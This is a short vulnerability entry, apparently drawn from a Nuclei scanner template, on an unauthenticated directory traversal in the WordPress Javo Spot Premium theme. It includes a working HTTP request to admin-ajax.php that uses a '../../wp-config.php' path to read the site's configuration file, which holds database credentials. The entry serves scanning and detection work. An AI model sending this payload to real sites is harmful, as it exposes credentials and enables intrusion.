# Vulnerability: WordPress Javo Spot Premium Theme - Unauthenticated Directory Traversal
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-spot-premium-lfi.yaml`)

## Description
WordPress Javo Spot Premium Theme `wp-config` was discovered via local file inclusion. This file is remotely accessible and its content available for reading.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery
```

